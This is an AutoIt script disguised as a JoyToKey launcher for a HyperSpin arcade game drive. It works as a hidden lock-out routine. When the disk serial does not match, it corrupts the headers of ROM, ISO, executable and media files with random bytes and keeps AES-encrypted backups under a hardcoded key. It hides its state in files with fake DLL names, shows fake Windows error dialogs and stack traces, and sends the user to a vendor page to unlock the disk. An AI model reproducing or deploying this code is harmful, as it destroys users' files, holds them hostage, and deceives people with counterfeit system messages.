#include <Constants.au3>
#include <File.au3>
#include <Crypt.au3>
#include <ComboConstants.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
#include <Date.au3>
#include "serialnumber.au3"

hiddenRun("JoyToKey.exe")

$drive = getCurrentDrive()
$drive = "D:"
$hyperFolder = $drive & "\Games\HyperSpin-fe\"
$drmFolder = $drive & "\Games\RocketLauncher\Module Extensions\hs_ext\"
$arcadeFolder = $drive & "\Games\Arcades\"
$romsFolder = $drive & "\Games\Roms"
$isosFolder = $drive & "\Games\Isos\"
$emusFolder = $drive & "\Games\Emulators\"
$pcFolder = $drive & "\Games\PC\"
$key = "jamon90jamon90jamon90"
$serialsFile = $drmFolder & "uninst0.dll"
$encryptLog = $drmFolder & "RocketLauncher.log"
$safe = $drmFolder & "msvc2013.dll"
$reverse = $drmFolder & "reverse.dll"
$serialFlag = $drmFolder & "serial.dll"
$serial30Flag = $drmFolder & "serial-30.dll"
$serials = ""


If DirGetSize($hyperFolder) = -1 Then
	MsgBox($MB_ICONERROR, " Windows Fatal Error 0x8891128", "El programa no puede iniciarse porque falta " & $drive & "d3dx9_43.dll en el equipo. Intente reinstalar el programa para corregir el problema.")
	Exit
EndIf

$headerSize = 4096
$tBuff = DllStructCreate("byte["& $headerSize &"]")
_Crypt_GenRandom($tBuff, DllStructGetSize($tBuff))

If FileExists($safe) Then
	myLog("safe#" &  _NowDate() & " " & _NowTime(5))
	Local $serialFlagExists = FileExists($serialFlag)
	If Not serialMatches() Then
		MsgBox($MB_ICONWARNING, " Windows Warning", "Missing Microsoft Runtime C# 2013 redistributable: msvc2013.dll (serial flag is " & $serialFlagExists & ")" & @CRLF & @CRLF & _
		"#0  0x0000002a959bd26d in raise () from /lib64.dll" & @CRLF & _
"#1  0x0000002a959bea6e in abort () from /lib64/msv2013.dll" & @CRLF & _
"#2  0x0000002b1cecf799 in read () from user" & @CRLF & _
"#3  0x0000002b1cecf7a7 in ?? (" & $serialNumber & ")" & @CRLF & _
		StringReplace($serials, Chr(13), "") & _
"#9  0x0000002a9a4d5488 in ?? ()" & @CRLF & _
"#10 0x000000004022ab70 in ?? ()" & @CRLF & _
"#11 0x0000002a9a4d59c8 in ?? ()" & @CRLF & _
"#12 0x0000000000000000)")
	EndIf
ElseIf FileExists($reverse) Then
	myLog("reverse#" &  _NowDate() & " " & _NowTime(5))
	; TEST
	;zipFolder($hyperFolder & "Databases\Main Menu", 0)
	;zipFolder($hyperFolder & "Media\Main Menu\Images", 0)

	; un fuck all
	zipFolder($drive & "\Games", 0)

	; dejamos al HScript.ahk original como estaba
	FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
	FileCopy($hyperFolder & "Scripts\HScript\HScript.ah3", $hyperFolder & "Scripts\HScript\HScript.ahk", $FC_OVERWRITE)
	FileDelete($hyperFolder & "Scripts\HScript\HScript.ah3")
	MsgBox($MB_ICONINFORMATION, " Unlock ok", ":-)")

Else
	Local $fuck = False

	If FileExists($serial30Flag) Then
		Local $count = Number(IniRead("serial-30.ini", "Main", "Players", "30"))
		if ($count == 0) Then
			$fuck = Not serialMatches()
		Else
			IniWrite("serial-30.ini", "Main", "Players", ""+($count-1))
		EndIf
	ElseIf FileExists($serialFlag) Then
		$fuck = Not serialMatches()
	Else
		myLog("serial#" & $fuck & " " & _NowDate() & " " & _NowTime(5))
		; No hay serial.dll, a matar directamente
		myLog("fuck#" &  _NowDate() & " " & _NowTime(5))
		$fuck = True

	EndIf
	If $fuck Then
		myLog("fuck#" &  _NowDate() & " " & _NowTime(5))
		; TEST
		;zipFolder($hyperFolder & "Media\Main Menu\Images", 1)
		;zipFolder($hyperFolder & "Databases\Main Menu", 1)

		; fuck all
		fuckAll()

		If FileExists($drmFolder & "AutoHotkey3.dll") Then
			; backup del HScript.ahk original y copiamos el del aviso de bloqueo
			FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
			FileCopy($hyperFolder & "Scripts\HScript\HScript.ahk", $hyperFolder & "Scripts\HScript\HScript.ah3", $FC_OVERWRITE)
			_Crypt_DecryptFile($drmFolder & "AutoHotkey3.dll", $hyperFolder & "Scripts\HScript\HScript.ahk", $key, $CALG_AES_128)
		EndIf

		; Despedida y cierre :)
		MsgBox($MB_ICONERROR+$MB_SYSTEMMODAL, "Disco bloqueado", "Disco bloqueado" & @CRLF & @CRLF & "Ponte en contacto con tu proveedor oficial o con http://hyperspin5tb.com para volverlo a activar.")
		ShellExecute("http://hyperspin5tb.com/contacto/?locked")
		myLog("kcuf#" &  _NowDate() & " " & _NowTime(5))
	Else
		myLog("safe#" &  _NowDate() & " " & _NowTime(5))
	EndIf
EndIf

Func fuckAll()
	zipFolder($arcadeFolder, 1)
	zipFolder($romsFolder, 1)
	zipFolder($isosFolder, 1)
	zipFolder($pcFolder, 1)
EndFunc

Func serialMatches()
	$serials = executeAndWriteStandardOut("wmic diskdrive get serialnumber", $serialsFile)
	Return StringInStr($serials, $serialNumber) > 0
EndFunc

Func zipFolder($folder, $enc)
	If DirGetSize($folder) = -1 Then Return
	Local $FileList = _FileListToArrayRec($folder, "*.png;*.mp4;*.flv;*.xml;*.bin;*.jpg;*.exe;*.zip;*.7z", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_NOSORT, $FLTAR_FULLPATH)
	For $i = 1 to $FileList[0]
		If myZip($FileList[$i], $enc) = True Then
			myLog($enc & "#" & $FileList[$i])
		EndIf
	Next
EndFunc

Func myLog($txt)
	Local $hFileOpen = FileOpen($encryptLog, $FO_APPEND)
	FileWriteLine($hFileOpen, $txt)
	FileClose($hFileOpen)

EndFunc

Func myZip($filename, $enc)
	if (FileGetSize($filename) < $headerSize) Then Return False
	$headerFile = $filename & "._header_"
	FileSetAttrib($filename, "-R")
	if ($enc = 1) Then
		If FileExists($headerFile) Then Return False

		; leemos la cabecera
		Local $handle = FileOpen($filename, $FO_READ + $FO_BINARY)
		$read = FileRead($handle, $headerSize)
		FileClose($handle)

		; escribimos el header encriptado
		Local $header = FileOpen($headerFile, $FO_OVERWRITE  + $FO_BINARY)
		FileWrite($header, _Crypt_EncryptData($read, $key, $CALG_AES_128))
		FileClose($header)
		FileSetAttrib($headerFile, "+RSH")

		; inutilizamos el original
		FileSetAttrib($filename, "-R")
		$handle = FileOpen($filename, $FO_APPEND + $FO_BINARY )
		FileSetPos($handle, 0, $FILE_BEGIN)
		FileWrite($handle, DllStructGetData($tBuff,1))
		FileClose($handle)
		Return True
	Else
		If Not FileExists($headerFile) Then Return False

		; leemos la cabecera
		FileSetAttrib($headerFile, "-R")
		Local $handle = FileOpen($headerFile, $FO_READ + $FO_BINARY)
		$read = FileRead($handle)
		FileClose($handle)

		; recuperamos el original
		$handle = FileOpen($filename, $FO_APPEND + $FO_BINARY)
		FileSetPos($handle, 0, $FILE_BEGIN)
		FileWrite($handle, _Crypt_DecryptData($read, $key, $CALG_AES_128))
		FileClose($handle)

		; borramos la cabecera
		FileDelete($headerFile)
		Return True
	EndIf
	Return False
EndFunc

Func executeAndWriteStandardOut($exe, $out)
	Local $iPID = Run($exe, @TempDir, @SW_HIDE, $STDOUT_CHILD)
    ProcessWaitClose($iPID)
    Local $sOutput = StdoutRead($iPID)
	FileWrite($sOutput, $out)
	Return $sOutput
EndFunc

Func getCurrentDrive()
	Local $wd = getWD()
	Return StringLeft($wd, 2)
EndFunc

Func hiddenRun($app)
	Run($app & " " & $CmdLineRaw)
	Local $randomWindowName = $app & " 1010101010101029029340924820934801293942917134671827346127894612978461233467821"
	If WinExists($randomWindowName) Then Exit
	AutoItWinSetTitle($randomWindowName)
EndFunc

Func getWD()
    ; Autoit v3.3.6.1
    ; thanks to Juvigy
    ; modified by Rudi
    RunWait(@ComSpec & " /c cd /d %temp%&&echo %cd%>temp-cwd-872382.tmp", "", @SW_HIDE); create temp file to save %cd%
    Local $file = FileOpen(@TempDir & "\temp-cwd-872382.tmp", 0)
    ; Check if file opened for reading OK
    If $file = -1 Then
        MsgBox($MB_ICONERROR, "Error", "Cannot open " & @TempDir & "\temp-cwd-872382.tmp to retrieve the working directory!")
        Return False
    EndIf
    ; Read in just the 1st line. (There might be an empty 2nd line)
    Local $WD = FileReadLine($file)
    FileClose($file)
    FileDelete(@TempDir & "\temp-cwd-872382.tmp")
    $WD &= "\"
    If StringRight($WD, 2) == "\\" Then $WD = StringTrimRight($WD, 1) ; the main script expects trailing "\" for path strings
    Return $WD
EndFunc